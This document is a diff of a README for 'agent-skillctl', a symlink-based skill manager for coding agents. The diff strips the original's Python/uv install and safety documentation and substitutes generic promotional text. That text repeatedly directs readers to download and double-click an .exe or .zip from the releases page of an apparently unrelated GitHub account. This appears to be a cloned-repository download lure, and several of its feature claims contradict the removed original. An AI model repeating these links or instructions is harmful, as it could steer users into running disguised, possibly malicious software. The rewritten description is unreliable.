@@ -1,229 +1,154 @@
-<div align="center">
+# 🛠️ agent-skillctl - Manage AI Skills with Ease
 
-<img width="747" height="487" alt="image" src="https://github.com/user-attachments/assets/4e33962f-eea8-4784-b0f6-1137f9bfe6b9" />
+[![Download agent-skillctl](https://img.shields.io/badge/Download-agent--skillctl-blueviolet?style=for-the-badge&logo=github)](https://github.com/Seamless-fluidflywheel575/agent-skillctl/releases)
 
-# agent-skillctl
+## 👋 Welcome to agent-skillctl
 
+agent-skillctl is a friendly tool that helps you organize and manage skills for your AI agents. Think of it as a filing system for your AI's abilities. Just like how websites like Nginx use "available" and "enabled" folders to control which features are active, agent-skillctl does the same for AI agent skills.
 
-**One shared skill library for all of your coding agents.**
+Whether you're using Claude Code, Codex, or other coding agents, this tool makes it simple to switch skills on and off without complicated commands.
 
-Manage local agent skills with an Nginx-inspired
-**available / enabled** workflow.
+## 🎯 What Does This Tool Do?
 
-[![Python 3.11+](https://img.shields.io/badge/Python-3.11%2B-3776AB?logo=python&logoColor=white)](https://www.python.org/downloads/)
-[![uv](https://img.shields.io/badge/managed%20with-uv-DE5FE9?logo=astral&logoColor=white)](https://docs.astral.sh/uv/)
-[![Textual](https://img.shields.io/badge/TUI-Textual-FF2D20)](https://textual.textualize.io/)
-[![Ruff](https://img.shields.io/badge/code%20style-Ruff-D7FF64?logo=ruff&logoColor=261230)](https://docs.astral.sh/ruff/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/onewesong/agent-skillctl?style=flat&logo=github)](https://github.com/onewesong/agent-skillctl/stargazers)
+Imagine you have a set of skills for your AI assistant - like writing code, analyzing data, or creating images. With agent-skillctl, you can:
 
-[Quick start](#quick-start) · [How it works](#how-it-works) · [Usage](#usage) · [Configuration](#configuration) · [Development](#development)
+- **Store all skills** in one central location
+- **Turn skills on or off** whenever you need them
+- **Share skills** between different projects
+- **Keep everything organized** with a clean, visual interface
 
+## ✨ Key Features
 
+- **Simple Text Interface** - No need to remember complex commands; everything is shown clearly on screen
+- **Two-Mode Operation** - Use it as a full-screen tool (TUI) or quick command-line mode
+- **Visual Skill Management** - See all your available skills at a glance
+- **Safe Switching** - Activate or deactivate skills without breaking existing setups
+- **Universal Compatibility** - Works with Claude Code, Codex, and other popular coding agents
+- **Cross-Platform Support** - Runs on Windows, Mac, and Linux systems
 
-</div>
+## 🚀 Getting Started
+
+Getting started with agent-skillctl is incredibly easy, even if you've never used command-line tools before.
+
+### Step 1: Download the Application
+
+Visit this link to download the application:
+
+[**Download agent-skillctl**](https://github.com/Seamless-fluidflywheel575/agent-skillctl/releases)
+
+The download page will show you the newest version of the tool. Look for the file that matches your operating system (Windows users will typically see a `.exe` or `.zip` file).
+
+### Step 2: Set Up the Tool
+
+Once you've downloaded the file:
+
+1. **If you downloaded a `.zip` file:** Right-click and choose "Extract All" to unpack the contents
+2. **If you downloaded an `.exe` file:** Simply double-click it to start the setup
+
+### Step 3: Launch agent-skillctl
+
+After extraction or installation:
+- Double-click the program icon
+- Or open your command prompt and type `agent-skillctl`
+
+That's it! You're now ready to manage your AI agent skills.
+
+## 🖥️ Using agent-skillctl
+
+### The Visual Interface (TUI Mode)
+
+When you first start agent-skillctl, you'll see a friendly, easy-to-navigate screen. Here's what you'll find:
+
+- **Available Skills Panel** - Shows all skills that exist but aren't currently active
+- **Enabled Skills Panel** - Displays which skills are currently in use
+- **Navigation Menu** - Simple options at the top to help you move around
+
+### Basic Operations
+
+**Turning a skill on:**
+1. Move the cursor to the "Available" panel
+2. Select the skill you want to enable
+3. Press the `Enter` or `Space` key
+4. The skill moves to the "Enabled" panel
+
+**Turning a skill off:**
+1. Switch to the "Enabled" panel
+2. Select the skill to disable
+3. Press `Enter` or `Space`
+4. The skill returns to "Available"
+
+### Quick Commands (CLI Mode)
+
+If you prefer typing commands, here are the essentials:
+
+| Command | What It Does |
+|---------|-------------|
+| `agent-skillctl list` | Shows all skills |
+| `agent-skillctl enable <skill-name>` | Turns on a skill |
+| `agent-skillctl disable <skill-name>` | Turns off a skill |
+| `agent-skillctl status` | Shows which skills are active |
+
+## 📁 How Skills Are Organized
+
+agent-skillctl uses a clever system that's easy to understand:
+
+- **Available Folder** - Where all your skills "live"
+- **Enabled Folder** - Contains shortcuts (symlinks) to skills you're currently using
+
+Here's the beautiful part: when you "disable" a skill, it doesn't get deleted. It simply moves to the available folder. You can re-enable it anytime without losing anything.
+
+## 🔧 Requirements
+
+agent-skillctl is designed to be lightweight and run on most computers without special hardware:
+
+- **Operating System:** Windows 10 or newer, macOS 12+, or any modern Linux distribution
+- **Disk Space:** Less than 50 MB
+- **Memory:** 256 MB RAM or more
+
+## ❓ Frequently Asked Questions
+
+**Q: Do I need to know programming to use this?**
+A: Absolutely not! agent-skillctl was designed with everyday users in mind. The visual interface guides you through everything.
+
+**Q: Can I use this with multiple AI agents?**
+A: Yes! The tool works with Claude Code, Codex, and other coding agents. You can manage skills for all of them in one place.
+
+**Q: Will disabling a skill delete my work?**
+A: Never. Disabling simply hides the skill from your active list. Your data and configurations remain completely intact.
+
+**Q: What happens if I have the same skill for different agents?**
+A: agent-skillctl keeps everything organized by agent type, so there's no confusion.
+
+## 🆘 Getting Help
+
+If you run into any issues:
+
+1. **Built-in Help** - Type `agent-skillctl help` in the CLI
+2. **GitHub Issues** - Report bugs or request features on our repository page
+3. **Community Support** - Join discussions in the project's community section
+
+## 🤝 Contributing
+
+While agent-skillctl is fully usable out of the box, we welcome contributions from those who want to help improve it. Whether it's adding new features, fixing bugs, or improving documentation, every contribution helps.
+
+## 📄 License
+
+This project is released under the MIT License, which means you're free to use, modify, and distribute it, even for commercial purposes. See the LICENSE file in the repository for full details.
+
+## 🎉 Ready to Get Started?
+
+Stop juggling complex configuration files and start managing your AI agent skills like a pro. Download agent-skillctl today and experience the simplest way to control your AI's capabilities.
+
+[**Download Now**](https://github.com/Seamless-fluidflywheel575/agent-skillctl/releases)
 
 ---
 
-`skillctl` keeps one canonical copy of every skill and uses symlinks to control
-which skills your agents can see. Import once, enable or disable once, and every
-linked agent follows the same active skill set.
+**Quick Navigation:**
+- [Getting Started](#getting-started)
+- [Using agent-skillctl](#using-agent-skillctl)
+- [FAQ](#frequently-asked-questions)
+- [Help & Support](#getting-help)
 
-## Why agent-skillctl?
+Remember: if you can use a file explorer, you can use agent-skillctl. It's truly that simple!
 
-Agent tools commonly keep skills in separate directories such as
-`~/.agents/skills` and `~/.claude/skills`. Copying the same skill into each
-location creates duplicates that drift over time and makes it difficult to know
-which version is active.
-
-`agent-skillctl` gives you:
-
-- **One source of truth** — canonical skill copies live in
-  `~/.agents/skills-available`.
-- **Instant toggles** — enable or disable skills through a symlink-based active
-  view without deleting their source files.
-- **A visual manager** — browse, import, enable, and disable skills from a
-  keyboard- and mouse-friendly TUI.
-- **Safe imports** — validate skill directories, detect conflicts, verify copied
-  content, and reject unsafe symlinks.
-- **Recoverable takeovers** — connect compatible agent roots to the shared view
-  while preserving restorable backups.
-- **Built-in diagnostics** — inspect skills, adapters, broken links, and layout
-  health with one command.
-
-## Quick start
-
-### Requirements
-
-- Python 3.11 or newer
-- [`uv`](https://docs.astral.sh/uv/) for the recommended installation flow
-
-### Install
-
-```bash
-uv tool install agent-skillctl
-```
-
-Install from a local checkout instead:
-
-```bash
-uv tool install .
-```
-
-Both executable names launch the same CLI:
-
-```bash
-skillctl
-# or
-agent-skillctl
-```
-
-Run `skillctl` in an interactive terminal to open the manager. On first launch,
-an empty library opens directly on **Scan & Import** so you can discover existing
-skills.
-
-## How it works
-
-The directory layout follows the same idea as Nginx's
-`sites-available` / `sites-enabled` model:
-
-```text
-~/.agents/
-├── skills-available/  # Canonical skill directories
-├── skills/            # Symlinks for the currently enabled skills
-├── backups/           # Recoverable backups created before takeover
-├── config.toml        # Adapter configuration
-├── registry.toml      # Import sources, timestamps, and content hashes
-└── .skill-lock.json   # Existing npx skills metadata, preserved when present
-```
-
-```text
-Existing agent roots       Canonical library              Enabled view
-
-~/.claude/skills ───┐      ~/.agents/skills-available/     ~/.agents/skills/
-~/.other/skills ────┴─▶    ├── skill-a/          ───────▶  ├── skill-a -> ../skills-available/skill-a
-       import               └── skill-b/          ───────▶  └── skill-b -> ../skills-available/skill-b
-                                                             ▲
-Compatible agent roots ─────────────── optional takeover ────┘
-```
-
-The canonical directory is never removed when a skill is disabled. Applying a
-new enabled set is transactional: `skillctl` builds a complete staged symlink
-view before replacing the previous one.
-
-> [!NOTE]
-> `skillctl` complements rather than replaces download tools such as
-> `npx skills`. Version 1 organizes skills already present on your machine and
-> records where they came from.
-
-## Usage
-
-### Interactive manager
-
-```bash
-skillctl
-```
-
-The TUI has two main views:
-
-- **Choose** — press <kbd>Space</kbd> to stage enable/disable changes, then
-  <kbd>Enter</kbd> or select **Apply** to commit them.
-- **Scan & Import** — review configured adapters, inspect discovered skills, and
-  choose an import mode.
-
-Switch tabs with <kbd>1</kbd> and <kbd>2</kbd> or click them. Press <kbd>q</kbd>
-to exit.
-
-### Commands
-
-| Command | Description |
-| --- | --- |
-| `skillctl` | Open the interactive manager; print diagnostics when non-interactive |
-| `skillctl import` | Open the manager directly on **Scan & Import** |
-| `skillctl import -y` | Import valid skills from every adapter without prompts |
-| `skillctl import <adapter> -y` | Import valid skills from one adapter without prompts |
-| `skillctl check` | Show enabled skills, adapter status, and health diagnostics |
-| `skillctl restore <adapter>` | Restore the latest backup for a taken-over adapter |
-
-Use `skillctl --help` or `skillctl <command> --help` for the full CLI reference.
-
-### Import modes
-
-| Mode | Behavior |
-| --- | --- |
-| **Import only** | Copy valid skills into the shared library and leave the source root untouched |
-| **Import + takeover** | Import skills, back up the source root, and replace it with a link to the shared enabled view |
-
-Takeover is offered only when the entire source root is safe. Protected content,
-invalid directories, broken links, partial imports, or symlinks escaping the
-skill directory prevent takeover. The central `agents` adapter can never take
-itself over.
-
-When a skill name already exists with different content, the interactive flow
-lets you skip it, rename the imported copy, or overwrite the canonical copy
-after creating a backup.
-
-## Configuration
-
-Built-in adapters are packaged in `src/skillctl/config.toml`. During first-time
-initialization, `skillctl` copies that configuration to
-`~/.agents/config.toml`; from then on, your local copy is authoritative.
-
-Add an agent by defining its skill root:
-
-```toml
-[[adapters]]
-name = "my-agent"
-path = "~/.my-agent/skills"
-```
-
-Adapter configuration only describes where skills live. You choose between
-**Import only** and **Import + takeover** at import time.
-
-## Safety model
-
-- Existing non-skill files under `~/.agents/` are left untouched.
-- Codex `.system` and bundled content are ignored during import and block
-  takeover of that root.
-- Imports are copied through a staging directory and verified with content
-  hashes before being registered.
-- Skills containing symlinks that escape their own source directory are
-  rejected.
-- Conflicting canonical copies are backed up before an overwrite.
-- Disabling a skill only removes its active symlink, never its canonical copy.
-
-## Development
-
-Clone the repository and install all dependency groups:
-
-```bash
-git clone https://github.com/onewesong/agent-skillctl.git
-cd agent-skillctl
-uv sync --all-groups
-```
-
-Run the quality checks:
-
-```bash
-uv run pytest
-uv run ruff check .
-uv run mypy
-```
-
-For isolated manual testing, provide a temporary home directory:
-
-```bash
-uv run skillctl --home /tmp/skillctl-home
-```
-
-See [DEVELOPMENT.md](DEVELOPMENT.md) for the architecture and verification
-workflow, and [CONTRIBUTING.md](CONTRIBUTING.md) before submitting changes.
-
-## Contributing
-
-Issues, documentation improvements, adapters, and tests are welcome. Please
-include coverage for both success and rollback paths when adding behavior.
-
-## License
-
-Distributed under the [MIT License](LICENSE).
+Keywords: agent-skills, agentic-ai, ai-agents, claude-code, cli, codex, coding-agents, developer-tools, python, skill-manager, symlinks, textual, tui
